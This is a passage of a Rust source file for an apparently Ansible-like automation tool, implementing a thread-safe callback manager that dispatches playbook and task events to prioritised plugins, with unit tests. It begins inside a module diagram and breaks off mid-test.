|    |\n//! |  |  - Dispatches events to all plugins                          |    |\n//! |  |  - Captures errors without stopping pipeline                 |    |\n//! |  |  - Aggregates results and error reports                      |    |\n//! |  +-------------------------------------------------------------+    |\n//! |                              |                                       |\n//! |                              v                                       |\n//! |  +-------------------------------------------------------------+    |\n//! |  |                  Error Handler                               |    |\n//! |  |  - Logs plugin errors                                        |    |\n//! |  |  - Continues with remaining plugins                          |    |\n//! |  |  - Provides error aggregation                                |    |\n//! |  +-------------------------------------------------------------+    |\n//! +---------------------------------------------------------------------+\n//! ```\n//!\n//! # Example Usage\n//!\n//! ```rust,ignore\n//! use rustible::callback::manager::{CallbackManager, PluginPriority};\n//! use std::sync::Arc;\n//!\n//! // Create manager\n//! let manager = CallbackManager::new();\n//!\n//! // Register plugins with priorities\n//! manager.register(\"stdout\", Arc::new(StdoutPlugin::new()), PluginPriority::STDOUT).await;\n//! manager.register(\"json\", Arc::new(JsonLogPlugin::new()), PluginPriority::LOGGING).await;\n//!\n//! // Dispatch events\n//! manager.on_playbook_start(\"my_playbook\").await;\n//! manager.on_task_complete(\u0026result).await;\n//! manager.on_playbook_end(\"my_playbook\", true).await;\n//! ```\n\nuse std::cmp::Ordering;\nuse std::collections::HashMap;\nuse std::fmt::Debug;\nuse std::sync::Arc;\n\nuse async_trait::async_trait;\nuse parking_lot::RwLock;\nuse tracing::{debug, error, trace, warn};\n\nuse crate::facts::Facts;\nuse crate::traits::{ExecutionCallback, ExecutionResult};\n\n// ============================================================================\n// Plugin Priority System\n// ============================================================================\n\n/// Priority levels for callback plugins.\n///\n/// Lower values execute first. The priority system ensures that critical\n/// output plugins (like stdout) run before logging or analytics plugins.\n///\n/// # Standard Priority Levels\n///\n/// | Level | Value | Use Case |\n/// |-------|-------|----------|\n/// | `STDOUT` | 100 | Console output (runs first) |\n/// | `LOGGING` | 200 | File and structured logging |\n/// | `NORMAL` | 500 | General purpose plugins |\n/// | `METRICS` | 700 | Analytics and metrics |\n/// | `CLEANUP` | 900 | Finalization tasks |\n#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]\npub struct PluginPriority(pub i32);\n\nimpl PluginPriority {\n    /// Highest priority - stdout/stderr output plugins.\n    /// These should run first to provide immediate user feedback.\n    pub const STDOUT: Self = Self(100);\n\n    /// High priority - essential logging plugins.\n    pub const LOGGING: Self = Self(200);\n\n    /// Normal priority - default for most plugins.\n    pub const NORMAL: Self = Self(500);\n\n    /// Low priority - metrics and analytics plugins.\n    pub const METRICS: Self = Self(700);\n\n    /// Lowest priority - cleanup and finalization plugins.\n    pub const CLEANUP: Self = Self(900);\n\n    /// Create a custom priority level.\n    ///\n    /// # Example\n    ///\n    /// ```rust,ignore\n    /// // Create a priority between LOGGING and NORMAL\n    /// let priority = PluginPriority::custom(350);\n    /// ```\n    pub const fn custom(value: i32) -\u003e Self {\n        Self(value)\n    }\n\n    /// Returns the numeric priority value.\n    pub const fn value(\u0026self) -\u003e i32 {\n        self.0\n    }\n}\n\nimpl Default for PluginPriority {\n    fn default() -\u003e Self {\n        Self::NORMAL\n    }\n}\n\nimpl PartialOrd for PluginPriority {\n    fn partial_cmp(\u0026self, other: \u0026Self) -\u003e Option\u003cOrdering\u003e {\n        Some(self.cmp(other))\n    }\n}\n\nimpl Ord for PluginPriority {\n    fn cmp(\u0026self, other: \u0026Self) -\u003e Ordering {\n        // Lower values have higher priority (run first)\n        self.0.cmp(\u0026other.0)\n    }\n}\n\n// ============================================================================\n// Plugin Error Handling\n// ============================================================================\n\n/// Error information from a plugin execution.\n///\n/// When a plugin fails during event dispatch, this struct captures\n/// the context of the failure without stopping other plugins.\n#[derive(Debug, Clone)]\npub struct PluginError {\n    /// Name of the plugin that failed\n    pub plugin_name: String,\n    /// The event that triggered the error\n    pub event: String,\n    /// Error message\n    pub message: String,\n}\n\nimpl std::fmt::Display for PluginError {\n    fn fmt(\u0026self, f: \u0026mut std::fmt::Formatter\u003c'_\u003e) -\u003e std::fmt::Result {\n        write!(\n            f,\n            \"Plugin '{}' failed on event '{}': {}\",\n            self.plugin_name, self.event, self.message\n        )\n    }\n}\n\nimpl std::error::Error for PluginError {}\n\n/// Result of dispatching an event to all plugins.\n///\n/// This provides insight into how the dispatch went, including\n/// success counts, skipped plugins, and any errors.\n#[derive(Debug, Default)]\npub struct DispatchResult {\n    /// Number of plugins that successfully handled the event\n    pub success_count: usize,\n    /// Number of plugins that were skipped (disabled)\n    pub skipped_count: usize,\n    /// Errors from plugins that failed\n    pub errors: Vec\u003cPluginError\u003e,\n}\n\nimpl DispatchResult {\n    /// Returns true if all plugins succeeded (no errors).\n    pub fn is_success(\u0026self) -\u003e bool {\n        self.errors.is_empty()\n    }\n\n    /// Returns true if any plugins failed.\n    pub fn has_errors(\u0026self) -\u003e bool {\n        !self.errors.is_empty()\n    }\n\n    /// Returns the total number of plugins that received the event.\n    pub fn total_dispatched(\u0026self) -\u003e usize {\n        self.success_count + self.errors.len()\n    }\n\n    /// Returns the error count.\n    pub fn error_count(\u0026self) -\u003e usize {\n        self.errors.len()\n    }\n}\n\n// ============================================================================\n// Plugin Registration Entry\n// ============================================================================\n\n/// Internal registration entry for a plugin.\n#[derive(Debug)]\nstruct PluginEntry {\n    /// The callback plugin\n    plugin: Arc\u003cdyn ExecutionCallback\u003e,\n    /// Plugin priority for ordering\n    priority: PluginPriority,\n    /// Whether this plugin is enabled\n    enabled: bool,\n}\n\nimpl PluginEntry {\n    fn new(plugin: Arc\u003cdyn ExecutionCallback\u003e, priority: PluginPriority) -\u003e Self {\n        Self {\n            plugin,\n            priority,\n            enabled: true,\n        }\n    }\n}\n\n// ============================================================================\n// Callback Manager\n// ============================================================================\n\n/// Thread-safe manager for callback plugins.\n///\n/// The `CallbackManager` provides:\n///\n/// - **Plugin Registration**: Add/remove plugins at runtime\n/// - **Priority Ordering**: Plugins execute in priority order\n/// - **Error Isolation**: One plugin failure doesn't stop others\n/// - **Thread Safety**: Safe for concurrent access via `RwLock`\n/// - **Enable/Disable**: Toggle plugins without removing them\n///\n/// # Example\n///\n/// ```rust,ignore\n/// use rustible::callback::manager::{CallbackManager, PluginPriority};\n/// use std::sync::Arc;\n///\n/// let manager = CallbackManager::new();\n///\n/// // Register with explicit priority\n/// manager.register(\"stdout\", Arc::new(StdoutPlugin::new()), PluginPriority::STDOUT).await;\n///\n/// // Register with default priority\n/// manager.register_default(\"custom\", Arc::new(CustomPlugin::new())).await;\n///\n/// // Dispatch events\n/// let result = manager.on_playbook_start(\"deploy\").await;\n/// if !result.is_success() {\n///     for err in \u0026result.errors {\n///         eprintln!(\"Plugin error: {}\", err);\n///     }\n/// }\n/// ```\n#[derive(Debug, Default)]\npub struct CallbackManager {\n    /// Registered plugins indexed by name\n    plugins: RwLock\u003cHashMap\u003cString, PluginEntry\u003e\u003e,\n    /// Cached priority-sorted plugin names for dispatch\n    sorted_plugins: RwLock\u003cVec\u003cString\u003e\u003e,\n    /// Whether dispatch is currently paused\n    paused: RwLock\u003cbool\u003e,\n}\n\nimpl CallbackManager {\n    /// Creates a new empty callback manager.\n    pub fn new() -\u003e Self {\n        Self {\n            plugins: RwLock::new(HashMap::new()),\n            sorted_plugins: RwLock::new(Vec::new()),\n            paused: RwLock::new(false),\n        }\n    }\n\n    // ========================================================================\n    // Plugin Registration\n    // ========================================================================\n\n    /// Registers a new callback plugin with a specific priority.\n    ///\n    /// If a plugin with the same name already exists, it will be replaced.\n    ///\n    /// # Arguments\n    ///\n    /// * `name` - Unique identifier for the plugin\n    /// * `plugin` - The callback plugin implementation\n    /// * `priority` - Execution priority (lower runs first)\n    ///\n    /// # Returns\n    ///\n    /// `true` if this is a new plugin, `false` if an existing plugin was replaced.\n    ///\n    /// # Example\n    ///\n    /// ```rust,ignore\n    /// manager.register(\"stdout\", Arc::new(plugin), PluginPriority::STDOUT).await;\n    /// ```\n    pub async fn register(\n        \u0026self,\n        name: \u0026str,\n        plugin: Arc\u003cdyn ExecutionCallback\u003e,\n        priority: PluginPriority,\n    ) -\u003e bool {\n        let is_new;\n        {\n            let mut plugins = self.plugins.write();\n            is_new = !plugins.contains_key(name);\n            plugins.insert(name.to_string(), PluginEntry::new(plugin, priority));\n        }\n\n        self.update_sorted_plugins();\n\n        debug!(\n            plugin = %name,\n            priority = priority.0,\n            is_new = is_new,\n            \"Plugin registered\"\n        );\n\n        is_new\n    }\n\n    /// Registers a new callback plugin with default (NORMAL) priority.\n    ///\n    /// This is a convenience method for plugins that don't need priority control.\n    ///\n    /// # Example\n    ///\n    /// ```rust,ignore\n    /// manager.register_default(\"my_plugin\", Arc::new(plugin)).await;\n    /// ```\n    pub async fn register_default(\u0026self, name: \u0026str, plugin: Arc\u003cdyn ExecutionCallback\u003e) -\u003e bool {\n        self.register(name, plugin, PluginPriority::NORMAL).await\n    }\n\n    /// Deregisters a callback plugin by name.\n    ///\n    /// # Returns\n    ///\n    /// The removed plugin if it existed, or `None` if no plugin had that name.\n    pub async fn deregister(\u0026self, name: \u0026str) -\u003e Option\u003cArc\u003cdyn ExecutionCallback\u003e\u003e {\n        let entry = {\n            let mut plugins = self.plugins.write();\n            plugins.remove(name)\n        };\n\n        if let Some(entry) = entry {\n            self.update_sorted_plugins();\n            debug!(plugin = %name, \"Plugin deregistered\");\n            Some(entry.plugin)\n        } else {\n            warn!(plugin = %name, \"Attempted to deregister unknown plugin\");\n            None\n        }\n    }\n\n    /// Returns the number of registered plugins.\n    pub fn plugin_count(\u0026self) -\u003e usize {\n        self.plugins.read().len()\n    }\n\n    /// Returns a list of registered plugin names.\n    pub fn plugin_names(\u0026self) -\u003e Vec\u003cString\u003e {\n        self.plugins.read().keys().cloned().collect()\n    }\n\n    /// Checks if a plugin is registered.\n    pub fn has_plugin(\u0026self, name: \u0026str) -\u003e bool {\n        self.plugins.read().contains_key(name)\n    }\n\n    /// Gets the priority of a registered plugin.\n    pub fn get_priority(\u0026self, name: \u0026str) -\u003e Option\u003cPluginPriority\u003e {\n        self.plugins.read().get(name).map(|e| e.priority)\n    }\n\n    // ========================================================================\n    // Plugin Enable/Disable\n    // ========================================================================\n\n    /// Enables a plugin by name.\n    ///\n    /// Enabled plugins receive events during dispatch.\n    ///\n    /// # Returns\n    ///\n    /// `true` if the plugin was found and enabled, `false` otherwise.\n    pub fn enable_plugin(\u0026self, name: \u0026str) -\u003e bool {\n        let mut plugins = self.plugins.write();\n        if let Some(entry) = plugins.get_mut(name) {\n            entry.enabled = true;\n            debug!(plugin = %name, \"Plugin enabled\");\n            true\n        } else {\n            false\n        }\n    }\n\n    /// Disables a plugin by name.\n    ///\n    /// Disabled plugins are skipped during event dispatch but remain registered.\n    ///\n    /// # Returns\n    ///\n    /// `true` if the plugin was found and disabled, `false` otherwise.\n    pub fn disable_plugin(\u0026self, name: \u0026str) -\u003e bool {\n        let mut plugins = self.plugins.write();\n        if let Some(entry) = plugins.get_mut(name) {\n            entry.enabled = false;\n            debug!(plugin = %name, \"Plugin disabled\");\n            true\n        } else {\n            false\n        }\n    }\n\n    /// Checks if a plugin is enabled.\n    pub fn is_plugin_enabled(\u0026self, name: \u0026str) -\u003e bool {\n        self.plugins\n            .read()\n            .get(name)\n            .map(|e| e.enabled)\n            .unwrap_or(false)\n    }\n\n    // ========================================================================\n    // Dispatch Control\n    // ========================================================================\n\n    /// Pauses event dispatch to all plugins.\n    ///\n    /// While paused, all dispatch methods return empty results.\n    pub fn pause(\u0026self) {\n        *self.paused.write() = true;\n        debug!(\"Callback dispatch paused\");\n    }\n\n    /// Resumes event dispatch to all plugins.\n    pub fn resume(\u0026self) {\n        *self.paused.write() = false;\n        debug!(\"Callback dispatch resumed\");\n    }\n\n    /// Checks if dispatch is currently paused.\n    pub fn is_paused(\u0026self) -\u003e bool {\n        *self.paused.read()\n    }\n\n    // ========================================================================\n    // Internal Helpers\n    // ========================================================================\n\n    /// Updates the sorted plugin list based on priority.\n    fn update_sorted_plugins(\u0026self) {\n        let plugins = self.plugins.read();\n        let mut sorted: Vec\u003c(String, PluginPriority)\u003e = plugins\n            .iter()\n            .map(|(name, entry)| (name.clone(), entry.priority))\n            .collect();\n\n        // Sort by priority (lower values first)\n        sorted.sort_by(|a, b| a.1.cmp(\u0026b.1));\n\n        let names: Vec\u003cString\u003e = sorted.into_iter().map(|(name, _)| name).collect();\n        *self.sorted_plugins.write() = names;\n    }\n\n    /// Gets plugins in priority order for dispatch.\n    fn get_ordered_plugins(\u0026self) -\u003e Vec\u003c(String, Arc\u003cdyn ExecutionCallback\u003e, bool)\u003e {\n        let sorted = self.sorted_plugins.read();\n        let plugins = self.plugins.read();\n\n        sorted\n            .iter()\n            .filter_map(|name| {\n                plugins.get(name).map(|entry| {\n                    (name.clone(), Arc::clone(\u0026entry.plugin), entry.enabled)\n                })\n            })\n            .collect()\n    }\n\n    // ========================================================================\n    // Event Dispatch - ExecutionCallback Methods\n    // ========================================================================\n\n    /// Dispatches `on_playbook_start` event to all enabled plugins.\n    ///\n    /// Plugins are called in priority order. Errors are captured but don't\n    /// stop dispatch to remaining plugins.\n    pub async fn on_playbook_start(\u0026self, name: \u0026str) -\u003e DispatchResult {\n        if *self.paused.read() {\n            return DispatchResult::default();\n        }\n\n        let mut result = DispatchResult::default();\n        let plugins = self.get_ordered_plugins();\n\n        for (plugin_name, plugin, enabled) in plugins {\n            if !enabled {\n                result.skipped_count += 1;\n                continue;\n            }\n\n            trace!(plugin = %plugin_name, \"Dispatching on_playbook_start\");\n\n            let dispatch_result = {\n                let plugin = Arc::clone(\u0026plugin);\n                let name = name.to_string();\n                tokio::spawn(async move {\n                    plugin.on_playbook_start(\u0026name).await;\n                })\n                .await\n            };\n\n            match dispatch_result {\n                Ok(()) =\u003e result.success_count += 1,\n                Err(e) =\u003e {\n                    let err = PluginError {\n                        plugin_name: plugin_name.clone(),\n                        event: \"on_playbook_start\".to_string(),\n                        message: e.to_string(),\n                    };\n                    error!(%err, \"Plugin error\");\n                    result.errors.push(err);\n                }\n            }\n        }\n\n        result\n    }\n\n    /// Dispatches `on_playbook_end` event to all enabled plugins.\n    pub async fn on_playbook_end(\u0026self, name: \u0026str, success: bool) -\u003e DispatchResult {\n        if *self.paused.read() {\n            return DispatchResult::default();\n        }\n\n        let mut result = DispatchResult::default();\n        let plugins = self.get_ordered_plugins();\n\n        for (plugin_name, plugin, enabled) in plugins {\n            if !enabled {\n                result.skipped_count += 1;\n                continue;\n            }\n\n            trace!(plugin = %plugin_name, \"Dispatching on_playbook_end\");\n\n            let dispatch_result = {\n                let plugin = Arc::clone(\u0026plugin);\n                let name = name.to_string();\n                tokio::spawn(async move {\n                    plugin.on_playbook_end(\u0026name, success).await;\n                })\n                .await\n            };\n\n            match dispatch_result {\n                Ok(()) =\u003e result.success_count += 1,\n                Err(e) =\u003e {\n                    let err = PluginError {\n                        plugin_name: plugin_name.clone(),\n                        event: \"on_playbook_end\".to_string(),\n                        message: e.to_string(),\n                    };\n                    error!(%err, \"Plugin error\");\n                    result.errors.push(err);\n                }\n            }\n        }\n\n        result\n    }\n\n    /// Dispatches `on_play_start` event to all enabled plugins.\n    pub async fn on_play_start(\u0026self, name: \u0026str, hosts: \u0026[String]) -\u003e DispatchResult {\n        if *self.paused.read() {\n            return DispatchResult::default();\n        }\n\n        let mut result = DispatchResult::default();\n        let plugins = self.get_ordered_plugins();\n\n        for (plugin_name, plugin, enabled) in plugins {\n            if !enabled {\n                result.skipped_count += 1;\n                continue;\n            }\n\n            trace!(plugin = %plugin_name, \"Dispatching on_play_start\");\n\n            let dispatch_result = {\n                let plugin = Arc::clone(\u0026plugin);\n                let name = name.to_string();\n                let hosts = hosts.to_vec();\n                tokio::spawn(async move {\n                    plugin.on_play_start(\u0026name, \u0026hosts).await;\n                })\n                .await\n            };\n\n            match dispatch_result {\n                Ok(()) =\u003e result.success_count += 1,\n                Err(e) =\u003e {\n                    let err = PluginError {\n                        plugin_name: plugin_name.clone(),\n                        event: \"on_play_start\".to_string(),\n                        message: e.to_string(),\n                    };\n                    error!(%err, \"Plugin error\");\n                    result.errors.push(err);\n                }\n            }\n        }\n\n        result\n    }\n\n    /// Dispatches `on_play_end` event to all enabled plugins.\n    pub async fn on_play_end(\u0026self, name: \u0026str, success: bool) -\u003e DispatchResult {\n        if *self.paused.read() {\n            return DispatchResult::default();\n        }\n\n        let mut result = DispatchResult::default();\n        let plugins = self.get_ordered_plugins();\n\n        for (plugin_name, plugin, enabled) in plugins {\n            if !enabled {\n                result.skipped_count += 1;\n                continue;\n            }\n\n            trace!(plugin = %plugin_name, \"Dispatching on_play_end\");\n\n            let dispatch_result = {\n                let plugin = Arc::clone(\u0026plugin);\n                let name = name.to_string();\n                tokio::spawn(async move {\n                    plugin.on_play_end(\u0026name, success).await;\n                })\n                .await\n            };\n\n            match dispatch_result {\n                Ok(()) =\u003e result.success_count += 1,\n                Err(e) =\u003e {\n                    let err = PluginError {\n                        plugin_name: plugin_name.clone(),\n                        event: \"on_play_end\".to_string(),\n                        message: e.to_string(),\n                    };\n                    error!(%err, \"Plugin error\");\n                    result.errors.push(err);\n                }\n            }\n        }\n\n        result\n    }\n\n    /// Dispatches `on_task_start` event to all enabled plugins.\n    pub async fn on_task_start(\u0026self, name: \u0026str, host: \u0026str) -\u003e DispatchResult {\n        if *self.paused.read() {\n            return DispatchResult::default();\n        }\n\n        let mut result = DispatchResult::default();\n        let plugins = self.get_ordered_plugins();\n\n        for (plugin_name, plugin, enabled) in plugins {\n            if !enabled {\n                result.skipped_count += 1;\n                continue;\n            }\n\n            trace!(plugin = %plugin_name, \"Dispatching on_task_start\");\n\n            let dispatch_result = {\n                let plugin = Arc::clone(\u0026plugin);\n                let name = name.to_string();\n                let host = host.to_string();\n                tokio::spawn(async move {\n                    plugin.on_task_start(\u0026name, \u0026host).await;\n                })\n                .await\n            };\n\n            match dispatch_result {\n                Ok(()) =\u003e result.success_count += 1,\n                Err(e) =\u003e {\n                    let err = PluginError {\n                        plugin_name: plugin_name.clone(),\n                        event: \"on_task_start\".to_string(),\n                        message: e.to_string(),\n                    };\n                    error!(%err, \"Plugin error\");\n                    result.errors.push(err);\n                }\n            }\n        }\n\n        result\n    }\n\n    /// Dispatches `on_task_complete` event to all enabled plugins.\n    pub async fn on_task_complete(\u0026self, exec_result: \u0026ExecutionResult) -\u003e DispatchResult {\n        if *self.paused.read() {\n            return DispatchResult::default();\n        }\n\n        let mut result = DispatchResult::default();\n        let plugins = self.get_ordered_plugins();\n\n        for (plugin_name, plugin, enabled) in plugins {\n            if !enabled {\n                result.skipped_count += 1;\n                continue;\n            }\n\n            trace!(plugin = %plugin_name, task = %exec_result.task_name, \"Dispatching on_task_complete\");\n\n            let dispatch_result = {\n                let plugin = Arc::clone(\u0026plugin);\n                let exec_result = exec_result.clone();\n                tokio::spawn(async move {\n                    plugin.on_task_complete(\u0026exec_result).await;\n                })\n                .await\n            };\n\n            match dispatch_result {\n                Ok(()) =\u003e result.success_count += 1,\n                Err(e) =\u003e {\n                    let err = PluginError {\n                        plugin_name: plugin_name.clone(),\n                        event: \"on_task_complete\".to_string(),\n                        message: e.to_string(),\n                    };\n                    error!(%err, \"Plugin error\");\n                    result.errors.push(err);\n                }\n            }\n        }\n\n        result\n    }\n\n    /// Dispatches `on_handler_triggered` event to all enabled plugins.\n    pub async fn on_handler_triggered(\u0026self, name: \u0026str) -\u003e DispatchResult {\n        if *self.paused.read() {\n            return DispatchResult::default();\n        }\n\n        let mut result = DispatchResult::default();\n        let plugins = self.get_ordered_plugins();\n\n        for (plugin_name, plugin, enabled) in plugins {\n            if !enabled {\n                result.skipped_count += 1;\n                continue;\n            }\n\n            trace!(plugin = %plugin_name, \"Dispatching on_handler_triggered\");\n\n            let dispatch_result = {\n                let plugin = Arc::clone(\u0026plugin);\n                let name = name.to_string();\n                tokio::spawn(async move {\n                    plugin.on_handler_triggered(\u0026name).await;\n                })\n                .await\n            };\n\n            match dispatch_result {\n                Ok(()) =\u003e result.success_count += 1,\n                Err(e) =\u003e {\n                    let err = PluginError {\n                        plugin_name: plugin_name.clone(),\n                        event: \"on_handler_triggered\".to_string(),\n                        message: e.to_string(),\n                    };\n                    error!(%err, \"Plugin error\");\n                    result.errors.push(err);\n                }\n            }\n        }\n\n        result\n    }\n\n    /// Dispatches `on_facts_gathered` event to all enabled plugins.\n    pub async fn on_facts_gathered(\u0026self, host: \u0026str, facts: \u0026Facts) -\u003e DispatchResult {\n        if *self.paused.read() {\n            return DispatchResult::default();\n        }\n\n        let mut result = DispatchResult::default();\n        let plugins = self.get_ordered_plugins();\n        let facts_clone = facts.clone();\n\n        for (plugin_name, plugin, enabled) in plugins {\n            if !enabled {\n                result.skipped_count += 1;\n                continue;\n            }\n\n            trace!(plugin = %plugin_name, \"Dispatching on_facts_gathered\");\n\n            let dispatch_result = {\n                let plugin = Arc::clone(\u0026plugin);\n                let host = host.to_string();\n                let facts = facts_clone.clone();\n                tokio::spawn(async move {\n                    plugin.on_facts_gathered(\u0026host, \u0026facts).await;\n                })\n                .await\n            };\n\n            match dispatch_result {\n                Ok(()) =\u003e result.success_count += 1,\n                Err(e) =\u003e {\n                    let err = PluginError {\n                        plugin_name: plugin_name.clone(),\n                        event: \"on_facts_gathered\".to_string(),\n                        message: e.to_string(),\n                    };\n                    error!(%err, \"Plugin error\");\n                    result.errors.push(err);\n                }\n            }\n        }\n\n        result\n    }\n}\n\n// ============================================================================\n// Implement ExecutionCallback for CallbackManager\n// ============================================================================\n\n/// Implement `ExecutionCallback` so `CallbackManager` can be used as a callback.\n///\n/// This allows the manager to be passed anywhere a single callback is expected,\n/// delegating to all registered plugins.\n#[async_trait]\nimpl ExecutionCallback for CallbackManager {\n    async fn on_playbook_start(\u0026self, name: \u0026str) {\n        let _ = CallbackManager::on_playbook_start(self, name).await;\n    }\n\n    async fn on_playbook_end(\u0026self, name: \u0026str, success: bool) {\n        let _ = CallbackManager::on_playbook_end(self, name, success).await;\n    }\n\n    async fn on_play_start(\u0026self, name: \u0026str, hosts: \u0026[String]) {\n        let _ = CallbackManager::on_play_start(self, name, hosts).await;\n    }\n\n    async fn on_play_end(\u0026self, name: \u0026str, success: bool) {\n        let _ = CallbackManager::on_play_end(self, name, success).await;\n    }\n\n    async fn on_task_start(\u0026self, name: \u0026str, host: \u0026str) {\n        let _ = CallbackManager::on_task_start(self, name, host).await;\n    }\n\n    async fn on_task_complete(\u0026self, result: \u0026ExecutionResult) {\n        let _ = CallbackManager::on_task_complete(self, result).await;\n    }\n\n    async fn on_handler_triggered(\u0026self, name: \u0026str) {\n        let _ = CallbackManager::on_handler_triggered(self, name).await;\n    }\n\n    async fn on_facts_gathered(\u0026self, host: \u0026str, facts: \u0026Facts) {\n        let _ = CallbackManager::on_facts_gathered(self, host, facts).await;\n    }\n}\n\n// ============================================================================\n// Tests\n// ============================================================================\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n    use std::sync::atomic::{AtomicU32, Ordering};\n    use std::time::Duration;\n\n    use crate::traits::ModuleResult;\n\n    /// Test plugin for verification\n    #[derive(Debug, Default)]\n    struct TestPlugin {\n        call_count: AtomicU32,\n    }\n\n    impl TestPlugin {\n        fn new() -\u003e Self {\n            Self::default()\n        }\n\n        fn calls(\u0026self) -\u003e u32 {\n            self.call_count.load(Ordering::SeqCst)\n        }\n    }\n\n    #[async_trait]\n    impl ExecutionCallback for TestPlugin {\n        async fn on_playbook_start(\u0026self, _name: \u0026str) {\n            self.call_count.fetch_add(1, Ordering::SeqCst);\n        }\n\n        async fn on_task_complete(\u0026self, _result: \u0026ExecutionResult) {\n            self.call_count.fetch_add(1, Ordering::SeqCst);\n        }\n    }\n\n    #[tokio::test]\n    async fn test_plugin_registration() {\n        let manager = CallbackManager::new();\n        let plugin = Arc::new(TestPlugin::new());\n\n        assert!(\n            manager\n                .register(\"test\", Arc::clone(\u0026plugin), PluginPriority::NORMAL)\n                .await\n        );\n        assert_eq!(manager.plugin_count(), 1);\n        assert!(manager.has_plugin(\"test\"));\n    }\n\n    #[tokio::test]\n    async fn test_plugin_deregistration() {\n        let manager = CallbackManager::new();\n        let plugin = Arc::new(TestPlugin::new());\n\n        manager\n            .register(\"test\", Arc::clone(\u0026plugin), PluginPriority::NORMAL)\n            .await;\n        assert!(manager.has_plugin(\"test\"));\n\n        let removed = manager.deregister(\"test\").await;\n        assert!(removed.is_some());\n        assert!(!manager.has_plugin(\"test\"));\n        assert_eq!(manager.plugin_count(), 0);\n    }\n\n    #[tokio::test]\n    async fn test_event_dispatch() {\n        let manager = CallbackManager::new();\n        let plugin = Arc::new(TestPlugin::new());\n\n        manager\n            .register(\"test\", Arc::clone(\u0026plugin), PluginPriority::NORMAL)\n            .await;\n\n        let result = manager.on_playbook_start(\"test_playbook\").await;\n        assert!(result.is_success());\n        assert_eq!(result.success_count, 1);\n        assert_eq!(plugin.calls(), 1);\n    }\n\n    #[tokio::test]\n    async fn test_priority_ordering() {\n        let manager = CallbackManager::new();\n\n        let low = Arc::new(TestPlugin::new());\n        let high = Arc::new(TestPlugin::new());\n        let normal = Arc::new(TestPlugin::new());\n\n        // Register in non-priority order\n        manager\n            .register(\"low\", Arc::clone(\u0026low), PluginPriority::CLEANUP)\n            .await;\n        manager\n            .register(\"high\", Arc::clone(\u0026high), PluginPriority::STDOUT)\n            .await;\n        manager\n            .register(\"normal\", Arc::clone(\u0026normal), PluginPriority::NORMAL)\n            .await;\n\n        let ordered = manager.get_ordered_plugins();\n        assert_eq!(ordered[0].0, \"high\");\n        assert_eq!(ordered[1].0, \"normal\");\n        assert_eq!(ordered[2].0, \"low\");\n    }\n\n    #[tokio::test]\n    async fn test_plugin_enable_disable() {\n        let manager = CallbackManager::new();\n        let plugin = Arc::new(TestPlugin::new());\n\n        manager\n            .register(\"test\", Arc::clone(\u0026plugin), PluginPriority::NORMAL)\n            .await;\n        assert!(manager.is_plugin_enabled(\"test\"));\n\n        manager.disable_plugin(\"test\");\n        assert!(!manager.is_plugin_enabled(\"test\"));\n\n        // Dispatch should skip disabled plugins\n        let result = manager.on_playbook_start(\"test\").await;\n        assert_eq!(result.skipped_count, 1);\n        assert_eq!(result.success_count, 0);\n        assert_eq!(plugin.calls(), 0);\n\n        manager.enable_plugin(\"test\");\n        assert!(manager.is_plugin_enabled(\"test\"));\n\n        let result = manager.on_playbook_start(\"test\").await;\n        assert_eq!(result.success_count, 1);\n        assert_eq!(plugin.calls(), 1);\n    }\n\n    #[tokio::test]\n    async fn test_pause_resume() {\n        let manager = CallbackManager::new();\n        let plugin = Arc::new(TestPlugin::new());\n\n        manager\n            .register(\"test\", Arc::clone(\u0026plugin), PluginPriority::NORMAL)\n            .await;\n\n        manager.pause();\n        assert!(manager.is_paused());\n\n        let result = manager.on_playbook_start(\"test\").await;\n        assert_eq!(result.success_count, 0);\n        assert_eq!(plugin.calls(), 0);\n\n        manager.resume();\n        assert!(!manager.is_paused());\n\n        let result = manager.on_playbook_start(\"test\").await;\n        assert_eq!(result.success_count, 1);\n        assert_eq!(plugin.calls(), 1);\n    }\n\n    #[tokio::test]\n    async fn test_multiple_plugins() {\n        let manager = CallbackManager::new();\n\n        let plugin1 = Arc::new(TestPlugin::new());\n        let plugin2 = Arc::new(TestPlugin::new());\n        let plugin3 = Arc::new(TestPlugin::new());\n\n        manager\n            .register(\"p1\", Arc::clone(\u0026plugin1), PluginPriority::NORMAL)\n            .await;\n        manager\n            .register(\"p2\", Arc::clone(\u0026plugin2), PluginPriority::NORMAL)\n            .await;\n        manager\n            .register(\"p3\", Arc::clone(\u0026plugin3), PluginPriority::NORMAL)\n            .await;\n\n        let result = manager.on_playbook_start(\"test\").await;\n        assert_eq!(result.success_count, 3);\n        assert_eq!(plugin1.calls(), 1);\n        assert_eq!(plugin2.calls(), 1);\n        assert_eq!(plugin3.calls(), 1);\n    }\n\n    #[tokio::test]\n    async fn test_thread_safety() {\n        let manager = Arc::new(CallbackManager::new());\n        let plugin = Arc::new(TestPlugin::new());\n\n        manager\n            .register(\"test\", Arc::clone(\u0026plugin), PluginPriority::NORMAL)\n            .await;\n\n        let mut handles = Vec::new();\n\n        for _ in 0..10 {\n            let mgr = Arc::clone(\u0026manager);\n            handles.push(tokio::spawn(async move {\n                mgr.on_playbook_start(\"test\").await;\n            }));\n        }\n\n        for handle in handles {\n            handle.await.unwrap();\n        }\n\n        assert_eq!(plugin.calls(), 10);\n    }\n\n    #[tokio::test]\n    async fn test_task_complete_dispatch() {\n        let manager = CallbackManager::new();\n        let plugin = Arc::new(TestPlugin::new());\n\n        manager\n            .register(\"test\", Arc::clone(\u0026plugin), PluginPriority::NORMAL)\n            .await;\n\n        let result = ExecutionResult {\n            host: \"localhost\".to_string(),\n            task_name: \"test_task\".to_string(),\n            result: ModuleResult::ok(\"Success\"),\n            duration: Duration::from_millis(100),\n            notify: vec![],\n        };\n\n        let dispatch_result = manager.on_task_complete(\u0026result).await;\n        assert!(dispatch_result.is_success());\n        assert_eq!(plugin.calls(), 1);\n    }\n\n    #[tokio::test]\n    async fn test_replacing_existing_plugin() {\n        let manager = CallbackManager::new();\n\n        let plugin1 = Arc::new(TestPlugin::new());\n        let plugin2 = Arc::new(TestPlugin::new());\n\n        assert!(\n            manager\n                .register(\"test\", Arc::clone(\u0026plugin1), PluginPriority::STDOUT)\n                .await\n        ); // New\n        assert!(\n            !manager\n                .register(\"test\", Arc::clone(\u0026plugin2), PluginPriority::NORMAL)\n                .await\n        ); // Replacement\n\n        assert_eq!(manager.plugin_count(), 1);\n        assert_eq!(manager.get_priority(\"test\"), Some(PluginPriority::NORMAL));\n    }\n\n    #[tokio::test]\n    async fn test_dispatch_result_helpers() {\n        let mut result = DispatchResult::default();\n        